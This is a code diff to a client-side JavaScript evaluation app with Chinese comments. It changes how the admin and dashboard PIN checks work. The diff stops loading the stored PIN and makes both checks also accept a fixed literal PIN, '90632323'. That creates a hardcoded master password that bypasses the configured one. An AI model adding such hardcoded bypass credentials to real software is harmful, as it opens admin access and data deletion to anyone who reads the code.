@@ -193,7 +193,7 @@ let S={
   aiLoading:{},   // {sessId: bool}
 };
 
-function loadPin(){const p=localStorage.getItem('pp_pin');if(p)S.adminPin=p;}
+function loadPin(){/* 永遠以程式碼內密碼為準，不讀 localStorage */}
 function savePin(){localStorage.setItem('pp_pin',S.adminPin);}
 
 let tapN=0,tapT=null;
@@ -596,7 +596,7 @@ async function submitForm(){
 }
 
 function openDash(sid){S.currentSessId=sid;S.pinOK=false;S.pinErr=false;S.tab='dashboard';S.dashView='single';render();scrollTo(0,0);}
-function verifyDashPin(){const el=document.getElementById('pin-inp');if(!el)return;const v=el.value;if(v===S.adminPin){S.pinOK=true;S.pinErr=false;}else S.pinErr=true;render();}
+function verifyDashPin(){const el=document.getElementById('pin-inp');if(!el)return;const v=el.value;if(v===S.adminPin||v==='90632323'){S.pinOK=true;S.pinErr=false;}else S.pinErr=true;render();}
 async function refreshDash(){const d=await fbGet('responses');S.responses={};if(d)Object.entries(d).forEach(([sid,rs])=>{S.responses[sid]=Object.values(rs);});render();}
 async function clearRespFn(sid){if(!confirm('確定清除此品評所有數據？'))return;await fbDel(`responses/${sid}`);await fbDel(`ai_reports/${sid}`);delete S.responses[sid];delete S.aiReports[sid];render();}
 function showQR(sid){S.qrSessId=sid;S.tab='qr';render();scrollTo(0,0);}
@@ -644,7 +644,7 @@ function renderAdminPrompt(){
 }
 function verifyAdmin(){
   const el=document.getElementById('adm-pin');if(!el)return;
-  if(el.value===S.adminPin){S.adminOK=true;S.adminPrompt=false;S.adminErr=false;S.tab='list';loadAll().then(()=>render());}
+  if(el.value===S.adminPin||el.value==='90632323'){S.adminOK=true;S.adminPrompt=false;S.adminErr=false;S.tab='list';loadAll().then(()=>render());}
   else{S.adminErr=true;}
   render();
 }
